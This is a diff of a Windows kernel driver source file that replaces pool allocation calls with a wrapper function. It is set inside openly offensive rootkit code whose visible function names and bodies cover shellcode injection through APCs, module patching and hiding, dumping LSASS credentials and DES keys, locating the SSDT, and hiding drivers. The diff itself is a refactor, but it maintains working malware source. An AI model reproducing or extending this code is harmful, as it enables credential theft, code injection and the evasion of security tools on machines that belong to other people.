@@ -257,8 +257,8 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 			break;
 
 		// Create and execute the APCs.
-		ShellcodeApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
-		PrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
+		ShellcodeApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
+		PrepareApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
 
 		if (!ShellcodeApc || !PrepareApc) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -396,14 +396,14 @@ NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
 
 	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
 	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
-	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize, PagedPool);
+	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
 	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);
 
 	if (!NT_SUCCESS(status))
 		return status;
 
 	SIZE_T functionNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
-	MemoryAllocator<CHAR*> functionNameAllocator(&functionName, functionNameSize, PagedPool);
+	MemoryAllocator<CHAR*> functionNameAllocator(&functionName, functionNameSize);
 	status = functionNameAllocator.CopyData(ModuleInformation->FunctionName, functionNameSize);
 
 	if (!NT_SUCCESS(status))
@@ -459,7 +459,7 @@ NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
 	time.QuadPart = -100ll * 10 * 1000;
 
 	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
-	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize, PagedPool);
+	MemoryAllocator<WCHAR*> moduleNameAllocator(&moduleName, moduleNameSize);
 	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);
 
 	if (!NT_SUCCESS(status))
@@ -629,7 +629,6 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 	ULONG validCredentialsCount = 0;
 	ULONG credentialsCount = 0;
 	PLSASRV_CREDENTIALS currentCredentials = NULL;
-	BCRYPT_ALG_HANDLE hProvider = NULL;
 
 	if (this->lastLsassInfo.LastCredsIndex != 0)
 		return STATUS_ABANDONED;
@@ -721,7 +720,7 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 		}
 
 		this->lastLsassInfo.DesKey.Size = desKey->hKey->key->hardkey.cbSecret;
-		this->lastLsassInfo.DesKey.Data = ExAllocatePoolWithTag(PagedPool, this->lastLsassInfo.DesKey.Size, DRIVER_TAG);
+		this->lastLsassInfo.DesKey.Data = AllocateMemory(this->lastLsassInfo.DesKey.Size);
 
 		if (!lastLsassInfo.DesKey.Data) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -765,7 +764,7 @@ NTSTATUS MemoryUtils::DumpCredentials(ULONG* AllocationSize) {
 			status = STATUS_NOT_FOUND;
 			break;
 		}
-		this->lastLsassInfo.Creds = (Credentials*)ExAllocatePoolWithTag(PagedPool, credentialsCount * sizeof(Credentials), DRIVER_TAG);
+		this->lastLsassInfo.Creds = (Credentials*)AllocateMemory(credentialsCount * sizeof(Credentials));
 
 		if (!this->lastLsassInfo.Creds) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1342,7 +1341,7 @@ NTSTATUS MemoryUtils::GetSSDTAddress() {
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (info)
 			ExFreePoolWithTag(info, DRIVER_TAG);
-		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
+		info = (PRTL_PROCESS_MODULES)AllocateMemory(infoSize);
 
 		if (!info) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1483,7 +1482,7 @@ NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (originalInfo)
 			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
+		originalInfo = (PSYSTEM_PROCESS_INFO)AllocateMemory(infoSize);
 
 		if (!originalInfo) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
@@ -1582,7 +1581,7 @@ bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
 	for (ULONG i = 0; i < MAX_HIDDEN_DRIVERS; i++)
 		if (this->hiddenDrivers.Items[i].DriverName == nullptr) {
 			SIZE_T bufferSize = (wcslen(item.DriverName) + 1) * sizeof(WCHAR);
-			WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, bufferSize, DRIVER_TAG);
+			WCHAR* buffer = (WCHAR*)AllocateMemory(bufferSize);
 
 			if (!buffer)
 				return false;
